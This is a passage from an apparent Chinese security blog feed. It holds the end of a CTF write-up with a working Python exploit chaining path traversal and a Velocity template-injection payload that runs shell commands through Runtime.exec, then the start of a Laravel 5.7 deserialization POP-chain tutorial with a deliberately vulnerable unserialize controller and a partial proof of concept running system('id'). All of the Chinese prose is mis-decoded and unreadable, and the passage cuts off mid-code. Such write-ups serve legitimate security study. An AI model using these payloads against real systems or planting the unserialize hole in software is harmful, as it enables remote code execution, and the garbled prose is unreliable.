class="keyword">true</span>);</span><br><span class="line">            String title = request.queryParams(<span class="string">"title"</span>);</span><br><span class="line">            <span class="keyword">if</span> (title != <span class="keyword">null</span>) &#123;</span><br><span class="line">                log(<span class="string">"/tmp/"</span> + request.session().id(), <span class="string">"Client IP: "</span> + request.ip() + <span class="string">" -&gt; File: "</span> + title + <span class="string">"\n"</span>);</span><br><span class="line">                Template template = velocityEngine.getTemplate(<span class="string">"/home/ctf/web/src/main/resources/templates/"</span> + title);</span><br><span class="line">                StringWriter sw = <span class="keyword">new</span> StringWriter();</span><br><span class="line">                template.merge(context, sw);</span><br><span class="line">                <span class="keyword">return</span> sw;</span><br><span class="line">            &#125;</span><br><span class="line">            Template template = velocityEngine.getTemplate(<span class="string">"/home/ctf/web/src/main/resources/templates/index"</span>);</span><br><span class="line">            StringWriter sw = <span class="keyword">new</span> StringWriter();</span><br><span class="line">            template.merge(context, sw);</span><br><span class="line">            <span class="keyword">return</span> sw;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç é€»è¾‘æ˜¯titleå‚æ•°é™¤äº†ä¼šæŒ‰å€¼æ‰¾åˆ°å¯¹åº”æ¨¡æ¿æ–‡ä»¶æ¸²æŸ“ã€‚è¿˜ä¼šå°†å‚æ•°æŒ‰ç…§sessionidå­˜å‚¨åˆ°<code>tmp/</code>ä¸‹ã€‚é‚£ä¹ˆæ­¤å¤„åº”è¯¥å…ˆä¼ payloadå†è¿›è¡Œæ¸²æŸ“ã€‚å³å¯è§¦å‘sstiè¾¾æˆrce.<br>sessionä¸º<code>node0wjq18duzt9pg4ddli5qyyfqn3034.node0</code>è¿™ç§å½¢å¼ã€‚idå»æ‰<code>.node0</code>å³å¯ã€‚</p><p>ç®€å•å†™ä¸ªexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://122.112.253.135/'</span></span><br><span class="line"></span><br><span class="line">session=<span class="string">'node0wjq18duzt9pg4ddli5qyyfqn3034.node0'</span></span><br><span class="line">id=session.rstrip(<span class="string">'.node0'</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">data=&#123;'title':'../../../../src/main/java/Blog.java'&#125;</span></span><br><span class="line"><span class="string">r=requests.get(url,params=data,cookies=&#123;'JSESSIONID':session&#125;)</span></span><br><span class="line"><span class="string">print(r.text)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">data=&#123;<span class="string">'title'</span>:<span class="string">"#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('grep -r flag /tmp')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"</span>&#125;</span><br><span class="line">r=requests.get(url,params=data,cookies=&#123;<span class="string">'JSESSIONID'</span>:session&#125;)</span><br><span class="line">data=&#123;<span class="string">'title'</span>:<span class="string">'../../../../../../../tmp/'</span>+id&#125;</span><br><span class="line">r=requests.get(url,params=data,cookies=&#123;<span class="string">'JSESSIONID'</span>:session&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªpayloadæ˜¯æ‰¾äº†ä¸ªvelocityå›æ˜¾çš„payloadå†™çš„ã€‚é€»è¾‘ä¸Šè¿˜æ˜¯åå°„å°±ä¸å¤šè¯´äº†ã€‚å…¶å®ä¹‹å‰å­¦ä¹ JavaSecé‚£ä¸ªé¡¹ç›®é‡Œçš„sstipayloadä¹Ÿèƒ½æ‰§è¡Œã€‚ä½†æ˜¯ä¼¼ä¹å¤–å¸¦æ—¶æœ‰ç‚¹é—®é¢˜ã€‚</p><p>å”¯ä¸€æ¯”è¾ƒç‹—çš„å°±æ˜¯flagåœ¨<code>/tmp</code>ä¸‹ã€‚åœ¨tmpåˆ—ç›®å½•ä¼šå› ä¸ºsessionæ–‡ä»¶å¤ªå¤šè¿›è¡Œç›¸å…³æ“ä½œç›´æ¥å¡æ­»ã€‚ä¸€ä¸ªä¸ªè¯•å‘ç°æœ€ååªæœ‰<code>grep -r flag /tmp</code>ä¸ä¼šå¡ã€‚åšå®Œåå‘ç°æ¢äº†ä¸ªèŠ‚ç‚¹ï¼Œflagæ”¾æ ¹ç›®å½•äº†â€¦â€¦</p><p>å°±è¿™ä¹ˆå¤šå§ã€‚å¸Œæœ›æ–°å­¦æœŸä¸€åˆ‡é¡ºåˆ©ã€‚æ¯”èµ›æˆç»©èƒ½æ›´è¿›ä¸€æ­¥ã€‚æ•´ä¸ªæš‘å‡å­¦ä¹ çš„çŸ¥è¯†,åšè¿‡çš„é¢˜ï¼Œæ‰“è¿‡çš„æ¯”èµ›è®©è¿™ä¸¤ä¸ªæœˆæ²¡æœ‰è’åºŸï¼Œæ”¶è·è¿˜æ˜¯æŒºå¤§çš„ã€‚æ¯”è¾ƒå¯æƒœçš„æ˜¯æœ¬æ¥æ‰“ç®—è·Ÿå®Œçš„Commoncollectionså‡ æ¡é“¾å­ä»¥åŠjacksonï¼Œshiroç­‰ç­‰expçš„åŸç†æ²¡èƒ½å…¨éƒ¨å®Œæˆã€‚å¸Œæœ›è¿‡æ®µæ—¶é—´èƒ½æŠŠå‘å¡«äº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel-popchain</title>
      <link href="2020/08/17/Laravel-popchain/"/>
      <url>2020/08/17/Laravel-popchain/</url>
      
        <content type="html"><![CDATA[<p>è€ƒè™‘äº†ä¸‹è¿˜æ˜¯æ‰“ç®—æŠŠlaravelçš„é“¾å­è·Ÿä¸€éã€‚çœ‹äº†ä¸‹åŸºæœ¬ä¸Šå°±5.7,5.8ä¸¤ä¸ªç‰ˆæœ¬çš„rceååºåˆ—åŒ–popchainã€‚æ‰€ä»¥å·¥ä½œé‡åº”è¯¥ä¸å¤§ã€‚æ­£å¥½æœ€è¿‘å®Œæˆtpç³»åˆ—çš„popchainå­¦ä¹ å®¡è®¡ä»£ç çš„æ„Ÿè§‰è¿˜åœ¨,é‚£å°±è¶çƒ­æ‰“é“å§ ã€‚</p><a id="more"></a><p>å…³äºä»£ç è·å–:<br><code>composer create-project --prefer-dist laravel/laravel laravel58</code><br>åé¢åŠ ä¸Š<code>&quot;5.7.*&quot;</code>ä¸‹è½½5.7ç‰ˆæœ¬çš„ã€‚</p><p>å¦‚æœä¸‹è½½å‡ºé”™æœ€å¥½æ¢ä¸‹composeræºã€‚<br>ä¹‹åå¯ä»¥ç›´æ¥<code>php artisan serve --host=0.0.0.0</code>.è¿™æ ·php-cliå°±ä¼šé»˜è®¤ä»8000ç«¯å£ç›‘å¬èµ·ä¸€ä¸ªwebæœåŠ¡ã€‚ç›´æ¥æŒ‰ç…§publicå¯¹å¤–æ˜¾ç¤ºã€‚</p><p>ç„¶åé»˜è®¤å…³äºlaravelçš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·<code>artisan</code>ã€‚æˆ‘ä¸ªäººè®¤ä¸ºå®¡è®¡ä»£ç çš„è¯å¦‚æœæ˜¯ç™½ç›’å®¡è®¡çœ‹ä¸‹è·¯ç”±,ä¼šç”¨<code>php artisan route:list</code>å°±å·®ä¸å¤šäº†ã€‚<br>å½“ç„¶åé¢å¦‚æœæ˜¯å¼€å‘çš„è¯è‚¯å®šè¦å…¨é¢å­¦ä¹ ä¸‹å…·ä½“ç”¨æ³•ã€‚</p><h2 id="laravel5-7-unserialize"><a href="#laravel5-7-unserialize" class="headerlink" title="laravel5.7-unserialize"></a>laravel5.7-unserialize</h2><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ·»åŠ è·¯ç”±ä¸æ§åˆ¶å™¨ä»£ç ç»™ä¸€ä¸ªååºåˆ—åŒ–å…¥æ‰‹ç‚¹ã€‚<br>routes/web.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">"/demo"</span>,<span class="string">"\App\Http\Controllers\DemoController@demo"</span>);</span><br></pre></td></tr></table></figure><p>æ·»åŠ ä¸€ä¸ªdemoè·¯ç”±å¯¹åº”DemoControllerã€‚æ‰€ä»¥ç›´æ¥åœ¨app/Http/Controllersä¸‹å¢æ·»ä¸€ä¸ªç±»DemoControllerã€‚è¿™æ ·å‘½åç©ºé—´ä¹‹ç±»çš„ä¹Ÿä¼šè‡ªåŠ¨ç”Ÿæˆå¥½ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">            $code = $_GET[<span class="string">'c'</span>];</span><br><span class="line">            unserialize($code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Welcome to laravel5.7"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥é€šè¿‡demoè·¯ç”±è¿›è¡Œå‚æ•°ä¼ é€’ã€‚<br>expå°è¯•æ‰§è¡Œwhoami</p><p><img src="/2020/08/17/Laravel-popchain/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥å°±æ˜¯è·Ÿé“¾å­äº†ã€‚é¦–å…ˆæ˜¯å…¥æ‰‹ç‚¹æ‰¾<code>__destruct()</code>è‡ªä¸å¿…è¯´ã€‚<br>æ­¤å¤„å…¥æ‰‹çš„destructå…¶å®éå¸¸å¤šã€‚æˆ‘ä»¬æ‰¾åˆ°<code>src\Illuminate\Foundation\Testing\PendingCommand.php</code>ã€‚å³ Illuminate/Foundation/Testing/PendingCommandç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasExecuted) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;hasExecuted = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $exitCode = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoMatchingExpectationException $e) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($e-&gt;getMethodName() === <span class="string">'askQuestion'</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test-&gt;fail(<span class="string">'Unexpected question "'</span>.$e-&gt;getActualArguments()[<span class="number">0</span>]-&gt;getQuestion().<span class="string">'" was asked.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> $e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;expectedExitCode !== <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test-&gt;assertEquals(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;expectedExitCode, $exitCode,</span><br><span class="line">            <span class="string">"Expected status code &#123;$this-&gt;expectedExitCode&#125; but received &#123;$exitCode&#125;."</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $exitCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»ˆç‚¹å…¶å®å°±åœ¨runæ–¹æ³•ä¸­<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>è¿™å¥ä»£ç ã€‚å…³äºå®ƒçš„çœŸæ­£å«ä¹‰æˆ‘ä»¬å…ˆä¸å»æ·±ç©¶ã€‚ä»è¯­ä¹‰ä¸Šçœ‹ä¼¼ä¹æ˜¯è°ƒç”¨äº†å†…æ ¸è¿›è¡Œcallçš„å‘½ä»¤æ‰§è¡Œã€‚è€Œå®ƒæ˜¯åœ¨trycatchè¯­å¥ä¸­æ‰§è¡Œçš„ã€‚æ‰€ä»¥éœ€è¦åœ¨åˆ°è¿™ä¸€ä¸å‰éƒ½ä¸ä¼šå‡ºç°æŠ¥é”™ã€‚</p><p>é‡ç‚¹è·Ÿè¿›mockConsoleOutput.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mockConsoleOutput</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $mock = Mockery::mock(OutputStyle::class.<span class="string">'[askQuestion]'</span>, [</span><br><span class="line">        (<span class="keyword">new</span> ArrayInput(<span class="keyword">$this</span>-&gt;parameters)), <span class="keyword">$this</span>-&gt;createABufferedOutputMock(),</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> $i =&gt; $question) &#123;</span><br><span class="line">        $mock-&gt;shouldReceive(<span class="string">'askQuestion'</span>)</span><br><span class="line">            -&gt;once()</span><br><span class="line">            -&gt;ordered()</span><br><span class="line">            -&gt;with(Mockery::on(<span class="function"><span class="keyword">function</span> <span class="params">($argument)</span> <span class="title">use</span> <span class="params">($question)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $argument-&gt;getQuestion() == $question[<span class="number">0</span>];</span><br><span class="line">            &#125;))</span><br><span class="line">            -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($question, $i)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions[$i]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> $question[<span class="number">1</span>];</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app-&gt;bind(OutputStyle::class, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($mock)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $mock;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æœ‰ä¸€ä¸ªå°ç»†èŠ‚ã€‚çœ‹åˆ°ä¸ƒæœˆç«å¸ˆå‚…è·Ÿè¿™é‡Œæ—¶é€‰æ‹©æ‰“æ–­ç‚¹ç„¶åç›´æ¥step overå•æ­¥è·³è¿‡ã€‚å‘ç°èƒ½æ­£å¸¸æ‰§è¡Œåˆ°foreachã€‚æ‰€ä»¥å°±æ²¡å»çœ‹<code>$mock</code>é‚£è¡Œçš„ä»£ç ã€‚è¿™åº”è¯¥æ˜¯ä¸ºäº†å‡å°‘ä¸å¿…è¦çš„å®¡è®¡ä»£ç é‡ã€‚(å¬è¯´ä¸€è·¯çœ‹ä¸‹å»çš„è¯åˆè‡­åˆé•¿â€¦â€¦)<br><img src="/2020/08/17/Laravel-popchain/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç°åœ¨å¯ä»¥çœ‹å‘<code>$this-&gt;test-&gt;expectedQuestions</code>è¿™å¥ã€‚å…¶ä¸­expectedQuestionsæ˜¯ä¸ªæ•°ç»„ã€‚ä»æ‰§è¡Œexpæ¥çœ‹,æˆ‘ä»¬å±æ€§ä¸­å¹¶æ²¡æœ‰<code>$this-&gt;test</code>å¯¹è±¡.æ‰€ä»¥ä¼šè§¦å‘<code>__get()</code><br>æ—¢ç„¶å¦‚æ­¤å…¶å®å°±æ˜¯æ‰¾<code>__get</code>æ–¹æ³•è¿”å›å€¼å¯æ§çš„ç±»äº†ã€‚è¿™é‡Œæ‰¾åˆ°<br>src\Faker\DefaultGenerator.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($attribute)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;default;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¤§è‡´çš„ä¸€ä¸ªè„‰ç»œå·²ç»å‡ºæ¥äº†ã€‚ä½†æ˜¯æˆ‘ä»¬å¯¹æŸäº›å˜é‡è¿˜æ˜¯ä¸æ¸…æ¥šã€‚åŒæ—¶ä¹Ÿä¸çŸ¥é“æ˜¯å¦ä¼šæœ‰æŠ¥é”™é€€å‡ºã€‚å› æ­¤å¯ä»¥ç”¨ä¸€ä¸ªåŠæˆå“pocæ¥æ¢æµ‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test, $app, $command, $parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span>() &#123; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span>&#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>("1" =&gt; "1"));</span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, <span class="string">'system'</span>, <span class="keyword">array</span>(<span class="string">'id'</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒPendingCommandç±»çš„å››ä¸ªå‚æ•°æ˜¯åŸæ„é€ å‡½æ•°ä¸­å°±æœ‰çš„ã€‚è€Œä¸ºä»€ä¹ˆä¼šåœ¨è¿™é‡Œå‡ºç°<code>Illuminate\Foundation\Application</code>è¦åœ¨åé¢è§£é‡Šã€‚</p><p>æˆ‘ä»¬è¿˜æ˜¯ç›´æ¥æ‰“æ–­ç‚¹çœ‹å®ƒçš„æ‰§è¡Œã€‚å•æ­¥è·³è¿‡çš„è¯ä¼šå‘ç°åˆ°<code>$this-&gt;app-&gt;bind</code>ä¸ºæ­¢éƒ½æ˜¯å¯ä»¥æ­£å¸¸è¿›è¡Œçš„ã€‚ç›´åˆ°<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>è¿™ä¸ªæˆ‘ä»¬å‘½ä»¤æ‰§è¡Œçš„æœ€åä¸€æ­¥æ‰æŠ›å‡ºé”™è¯¯ã€‚ä¸€è·¯è·Ÿè¿‡å»å¯ä»¥çœ‹åˆ°æŠ¥é”™å…·ä½“å†…å®¹<br><img src="/2020/08/17/Laravel-popchain/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é‚£ä¹ˆæˆ‘ä»¬è‚¯å®šå¾—æ·±å…¥ä¸‹è¿™è¡Œä»£ç ã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦æ·»åŠ ä»£ç çœ‹<code>$this-&gt;app[Kernel::class]</code>.å› ä¸ºç›´æ¥è°ƒç”¨çš„è¯æˆ‘ä»¬æ˜¯æ²¡æ³•çœ‹å‡ºKernel::classçš„ã€‚æ‰€ä»¥æ¯”è¾ƒå¥½çš„æ–¹æ³•è¿˜æ˜¯å•ç‹¬æ‹¿å‡ºæ¥çœ‹ã€‚<br><img src="/2020/08/17/Laravel-popchain/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¯ä»¥çœ‹åˆ°ã€‚<code>$this-&gt;app</code>å³æˆ‘ä»¬ä¹‹å‰expä¸­å®ä¾‹åŒ–çš„<code>Illuminate\Foundation\Application</code>ç±»çš„å¯¹è±¡.è€Œ<code>Kernel::class</code>ä¼šå›ºå®šè¿”å›å­—ç¬¦ä¸²<code>Illuminate\Contracts\Console\Kernel</code></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å‘ç°åªè¦å•æ­¥è·³è¿‡<code>$app = $this-&gt;app[Kernel::class];</code>å°±ä¼šå‡ºé”™æŠ›å‡ºè·Ÿä¹‹å‰è°ƒç”¨ååºåˆ—åŒ–æ—¶ä¸€æ ·çš„é”™è¯¯ã€‚æ‰€ä»¥é—®é¢˜è‚¯å®šå‡ºåœ¨è¿™å¥ä»£ç ä¸Šã€‚é‚£ä¹ˆä¸€è·¯è·Ÿè¿›<br>ä¼šå‘ç°æ˜¯è°ƒç”¨äº†è¿™ä¹ˆå‡ ä¸ªå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 